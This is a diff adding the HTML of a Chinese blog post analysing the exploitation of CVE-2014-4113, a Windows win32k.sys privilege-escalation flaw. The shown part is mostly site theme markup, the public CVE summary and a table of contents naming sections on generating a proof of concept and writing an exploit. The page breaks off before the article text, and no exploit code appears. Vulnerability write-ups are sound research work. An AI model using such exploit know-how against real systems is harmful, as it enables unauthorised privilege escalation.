@@ -1,0 +1,1407 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.4.0 -->
+    <script>window.materialVersion = "1.4.0"</script>
+
+    <!-- Title -->
+    
+    <title>
+        
+            CVE-2014-4113 漏洞利用分析 | 
+        
+        b2ahex&#39;s blog
+    </title>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    
+    
+    
+    
+    
+        <link rel="dns-prefetch" href="https://www.google-analytics.com"/>
+    
+    
+    
+    
+    
+    
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="b2ahex">
+    <meta name="description" itemprop="description" content="作者：b2ahex
+1. 背景介绍
+win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  
+">
+    <meta name="keywords" content="null">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/blog/img/favicon.png">
+    <link rel="icon" sizes="192x192" href="/blog/img/favicon.png">
+    <link rel="apple-touch-icon" href="/blog/img/favicon.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="b2ahex&#39;s blog">
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="https://b2ahex.github.io">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="CVE-2014-4113 漏洞利用分析 | b2ahex&#39;s blog">
+    <meta property="og:image" content="/blog/img/favicon.png" />
+    <meta property="og:description" content="作者：b2ahex
+1. 背景介绍
+win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  
+">
+    
+
+    
+        <meta property="article:published_time" content="6月 29, 2017" />
+        <meta property="article:modified_time" content="6月 29, 2017" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="CVE-2014-4113 漏洞利用分析 | b2ahex&#39;s blog">
+    <meta name="twitter:description" content="作者：b2ahex
+1. 背景介绍
+win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  
+">
+    <meta name="twitter:image" content="/blog/img/favicon.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="https://b2ahex.github.io" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="https://b2ahex.github.io/blog/2017/06/29/4113分析/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "b2ahex&#39;s blog",
+        "logo": "/blog/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "b2ahex",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/blog/img/favicon.png"
+        },
+        "description": "Hi, nice to meet you"
+    },
+    "headline": "CVE-2014-4113 漏洞利用分析",
+    "url": "https://b2ahex.github.io/blog/2017/06/29/4113分析/index.html",
+    "datePublished": "6月 29, 2017",
+    "dateModified": "6月 29, 2017",
+    "description": "作者：b2ahex
+1. 背景介绍
+win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  
+",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://b2ahex.github.io"
+    }
+}
+</script>
+
+
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+materialVersion+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(data&&data.indexOf(versionString)===-1){lsloader.removeLS(key)}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload){cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}code=code.split(versionString)[1];if(/\.js?.+$/.test(versionNumber)){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload)}};lsloader.requestResource=function(name,path,cssonload){var that=this;if(/\.js?.+$/.test(path)){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else if(/\.css?.+$/.test(path)){this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import CSS & jQuery -->
+    
+        <style id="css/material.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/material.min.css","/blog/css/material.min.css?fJTiM/K1J3dWIruo3pxtAw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
+        <style id="css/style.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/style.min.css","/blog/css/style.min.css?oCSEO3ST+aEypEwttTDI9g==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
+        
+        
+            <style>
+    
+    
+    .footer-sns-twitter {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNTMyLjggMjA1YzEwIDQgMjMgMTAuOCAyOC44IDE1LjIgMTIuNiA5LjIgMTYuNiAxMC42IDI5LjQgOS40IDYuNi0uNiAxMy0zLjIgMjAuNC04LjIgMTEuMi03LjYgMTkuNC05LjIgMjMuNi01IDMuNiAzLjYgMi44IDktMi44IDE4LjYtNy4yIDEyLjQtNiAxOC44IDQuMiAyNC4yIDQuNCAyLjIgOC4yIDUuNiA4LjYgNy40IDEgNC44LTEyLjYgMjQuMi0yMiAzMS44LTExLjggOS4yLTE3LjIgMjIuNi0xOS42IDQ3LjgtNC44IDUwLjQtNy44IDY2LjYtMTYuNCA4NS40LTMgNy03IDE3LjgtOC44IDI0LTEuOCA2LjQtNSAxNC42LTcuNCAxOC40LTIuMiAzLjgtNy40IDEzLTExLjQgMjAuNC0xNy4yIDMwLjgtNDMuNCA2MS40LTcxLjQgODMuOC0yNS42IDIwLjQtNDYgMzMuMi02NC4yIDQwLjItOC40IDMuMi0xOCA3LjYtMjEuNCA5LjYtNy40IDQuNi0yMi40IDguNi01Ny4yIDE1LTYyLjIgMTEuNi03OS4yIDExLjQtMTM1LjYtMS0zMi40LTctMzguNi05LTUyLTE2LjgtMjEuNC0xMi42LTI0LjItMTQuOC0yNC4yLTE5LjQgMC02LjIgMTAuMi05LjIgMzUtMTAuNCAyMi40LTEgMjguNi0yLjYgNTctMTQuMiAyMy44LTkuOCAyOS40LTEyLjggMzAuNC0xNi44IDIuMi04LjItMy0xMy4yLTI2LjgtMjUuNC0yNS44LTEzLjItMzIuMi0xOC40LTQzLjgtMzUuOC05LTEzLjYtMTAtMjEuMi0zLjYtMzMuNiA1LjQtMTAuOCAzLjYtMTUtMTEuOC0yNS40LTktNi0xNC0xMS42LTIwLjgtMjIuNi0yMy40LTM3LjgtMjUtNTAuOC03LjItNTkuOCA0LjgtMi40IDkuNC01LjQgMTAuMi02LjYgMi44LTQuMi0uNC0xNS42LTguNC0yOS0xMS42LTE5LjYtMTMuMi0yNS44LTEzLjItNTUuMiAwLTI4LjggMi42LTM3LjggMTItNDAuMiA5LTIuMiAxNC44IDEgMzUuNiAyMC4yIDI0LjggMjIuOCA0My42IDM2LjYgNjIuOCA0NS44IDggMy44IDE3LjggOS4yIDIyIDEyIDQuMiAyLjggMTQuOCA3IDIzLjQgOS4yIDguNiAyLjIgMjQuMiA2LjggMzQuOCAxMC4yIDEzLjQgNC40IDIzLjYgNi40IDMzIDYuNiAxMi44LjIgMTQuMi0uMiAxOC42LTUuNCA0LTQuOCA0LjgtNy44IDQuOC0xOS4yIDAtMTQuNCA1LjYtMzkuNiAxMS4yLTUwLjYgNC4yLTguNCAyOS4yLTM0LjIgMzkuOC00MS40IDcuOC01LjQgMzUuNi0xNiA1Mi0yMCAxNC4yLTMuNiAzMi42LTEuMiA1Mi40IDYuOHoiLz48L3N2Zz4=);
+    }
+    
+    
+    .footer-sns-gplus {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHpNNDMwIDI5NS40YzQwLjYgMTUuNCA1Ni42IDIzLjggNzIuNiAzOC40IDYuOCA2LjIgNy4yIDE1LjIgMSAyMy40LTYuMiA4LTMzLjYgMzMuOC0zOSAzNi42LTUuNiAyLjgtMTcuNiAyLjgtMjMuMi0uMi0yLjQtMS4yLTguMi01LjItMTMtOC44LTExLjItOC42LTI0LjYtMTEuMi01NS4yLTExLjItMjcuNCAwLTQwLjYgMi42LTUyLjIgMTAuNC00LjQgMi44LTEyLjIgNy42LTE3LjIgMTAuNi0yMyAxMy4yLTUxLjQgNTUtNTUuOCA4Mi40LTIuNiAxNS42LTIuNCAzNC44LjIgNTEgMi44IDE3LjQgMTkuOCA0OC44IDM1LjIgNjUuMiAxNiAxNi42IDQ1IDMzLjYgNjIuOCAzNi42IDI2LjggNC40IDY1LjggMS42IDc5LjQtNS44IDIwLjYtMTEuNCAzMS0xOSA0MS0zMC40IDE4LjgtMjEuNiAyMy40LTM0LjIgMTUuNi00My44LTMuOC00LjgtNC40LTQuOC01MS01LjgtNjAuOC0xLjItNTYuMiAyLjItNTYuMi00My4yIDAtMzIuNC4yLTMzLjIgNC44LTM3IDQuNC0zLjYgOS0zLjggOTItMy44IDc5IDAgODcuOC40IDk0LjIgMy42IDExLjIgNS42IDEzIDExLjQgMTIuOCA0My40IDAgMjUuNC0uOCAzMC44LTcuNiA1OC00IDE2LjYtOS44IDM0LTEyLjYgMzktMi44IDUtOC4yIDE0LjItMTEuNiAyMC42LTguNCAxNS40LTI3LjIgMzYuOC00MC44IDQ2LjYtNS44IDQuNC0xMy44IDEwLjItMTcuNiAxMy4yLTMuOCAzLTExIDctMTYuMiA4LjgtNS4yIDEuOC0xNi4yIDYuNC0yNC40IDEwLTIyLjQgOS42LTM0LjggMTEuNi03MyAxMS42LTM3LjYuMi00Ny0xLjQtNzEtMTItOC4yLTMuNi0xNy42LTcuMi0yMC44LTgtMTUuOC0zLjgtNjctNDUuMi03Ny44LTYyLjgtMi4yLTMuOC03LjYtMTEuNi0xMS44LTE3LjItNC4yLTUuNC05LTE0LTEwLjYtMTktMS44LTQuOC02LjItMTYtMTAtMjQuOC0zLjYtOC44LTcuOC0yMi4yLTkuMi0yOS42LTMuMi0xOC44LTEuNC03OS40IDIuOC05MS40IDEzLjgtNDAuNiAzNS42LTc4IDU4LjgtMTAwLjIgMTQtMTMuNiA0Ny4yLTM2LjQgNTgtMzkuOCA0LjItMS40IDEzLjQtNS4yIDIwLjYtOC40IDIyLTEwIDMyLjgtMTEuNiA3Ni0xMSAzMy44LjYgNDAuNCAxLjIgNTAgNC44em0zNDAuOCA4MC44YzggMy42IDkuNiAxMS4yIDkuMiAzOS4yLS42IDM0LjQtLjYgMzQgNSAzOS42IDQuOCA1IDUuNCA1IDM3LjYgNSA0My40IDAgNDQuNC44IDQzLjIgMzYuMi0uOCAxNy0xLjIgMTguNC02LjQgMjMtNS40IDQuNi02LjYgNC44LTM3LjYgNC44LTMxLjIgMC0zMiAuMi0zNi44IDUtNS42IDUuNC01LjYgNC40LTUgNDEuMi40IDI2LjQuMiAyNy40LTQuNiAzMy00LjggNS42LTYgNS44LTI0LjQgNi40LTIwLjguOC0yOS42LTEuNC0zMy40LTguNC0xLjQtMi42LTItMTUuNi0xLjgtMzUuNi40LTMxLjIuNC0zMS42LTQuNi0zNi42cy01LjYtNS0zNi01Yy0xOC44IDAtMzMtLjgtMzYtMi4yLTcuNi0zLjYtOS42LTExLjItOC44LTMzLjguOC0yOC4yLjQtMjggNDEtMjggNDUuNCAwIDQ1LjQgMCA0NC42LTQyLjYtLjYtMzMtLjYtMzMgNS0zOC40IDQuNC00LjYgNi4yLTUgMjQuOC01IDExIDAgMjIuMiAxIDI1IDIuMnoiLz48L3N2Zz4=);
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+</style>
+
+        
+        <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"rel="stylesheet">
+
+
+        <script>lsloader.load("js/jquery.min.js","/blog/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==")</script>
+    
+    
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Analytics -->
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-101734086-1', 'auto');ga('send', 'pageview');
+</script>
+
+    <!-- Custom Head -->
+    
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-背景介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text">1. 背景介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">2. 漏洞分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-生成POC"><span class="post-toc-number">3.</span> <span class="post-toc-text">3. 生成POC</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-EXPLOIT"><span class="post-toc-number">4.</span> <span class="post-toc-text">4. EXPLOIT</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
+    
+
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/blog/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                CVE-2014-4113 漏洞利用分析
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/blog/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>b2ahex</strong>
+        <span>6月 29, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
